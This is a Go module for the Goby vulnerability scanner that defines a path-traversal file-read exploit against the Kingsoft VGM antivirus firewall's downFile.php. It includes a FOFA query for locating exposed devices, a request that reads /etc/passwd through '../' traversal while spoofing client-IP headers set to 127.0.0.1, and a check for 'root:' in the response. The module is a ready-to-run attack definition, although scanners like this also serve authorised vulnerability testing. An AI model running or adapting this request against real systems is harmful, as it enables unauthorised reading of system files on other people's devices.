package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
  "Name": "金山 VGM防毒墙 downFile.php 任意文件读取漏洞",
  "Description": "",
  "Product": "",
  "Homepage": "",
  "DisclosureDate": null,
  "Author": "清晨",
  "FofaQuery": "\"金山VGM\"",
  "GobyQuery": "\"金山VGM\"",
  "Level": "2",
  "Impact": "",
  "Recommendation": "",
  "References": [],
  "Is0day": false,
  "HasExp": false,
  "ExpParams": [],
  "ExpTips": {
    "Type": "",
    "Content": ""
  },
  "ScanSteps": [
    "AND",
    {
      "Request": {
        "method": "GET",
        "uri": "/downFile.php?filename=../../../../etc/passwd",
        "follow_redirect": true,
        "header": {
          "X-Forwarded-For": "127.0.0.1",
          "X-Forwarded": "127.0.0.1",
          "Forwarded-For": "127.0.0.1",
          "Forwarded": "127.0.0.1",
          "X-Requested-With": "127.0.0.1",
          "X-Forwarded-Proto": "127.0.0.1",
          "X-Forwarded-Host": "127.0.0.1",
          "X-remote-IP": "127.0.0.1",
          "X-remote-addr": "127.0.0.1",
          "True-Client-IP": "127.0.0.1",
          "X-Client-IP": "127.0.0.1",
          "Client-IP": "127.0.0.1",
          "X-Real-IP": "127.0.0.1",
          "Ali-CDN-Real-IP": "127.0.0.1",
          "Cdn-Src-Ip": "127.0.0.1",
          "Cdn-Real-Ip": "127.0.0.1",
          "CF-Connecting-IP": "127.0.0.1",
          "X-Cluster-Client-IP": "127.0.0.1",
          "WL-Proxy-Client-IP": "127.0.0.1",
          "Proxy-Client-IP": "127.0.0.1",
          "Fastly-Client-Ip": "127.0.0.1",
          "True-Client-Ip": "127.0.0.1",
          "X-Originating-IP": "127.0.0.1",
          "X-Host": "127.0.0.1",
          "X-Custom-IP-Authorization": "127.0.0.1"
        },
        "data_type": "text",
        "data": ""
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "200",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "root:",
            "bz": ""
          }
        ]
      },
      "SetVariable": []
    }
  ],
  "ExploitSteps": [
    "AND",
    {
      "Request": {
        "method": "GET",
        "uri": "/test.php",
        "follow_redirect": true,
        "header": {},
        "data_type": "text",
        "data": ""
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "200",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "test",
            "bz": ""
          }
        ]
      },
      "SetVariable": []
    }
  ],
  "Tags": [],
  "VulType": [],
  "CVEIDs": [
    ""
  ],
  "CNNVD": [
    ""
  ],
  "CNVD": [
    ""
  ],
  "CVSSScore": "",
  "Translation": {
    "CN": {
      "Name": "金山 VGM防毒墙 downFile.php 任意文件读取漏洞",
      "Product": "",
      "Description": "",
      "Recommendation": "",
      "Impact": "",
      "VulType": [],
      "Tags": []
    },
    "EN": {
      "Name": "VGM downFile.php read file",
      "Product": "",
      "Description": "",
      "Recommendation": "",
      "Impact": "",
      "VulType": [],
      "Tags": []
    }
  },
  "AttackSurfaces": {
    "Application": null,
    "Support": null,
    "Service": null,
    "System": null,
    "Hardware": null
  }
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}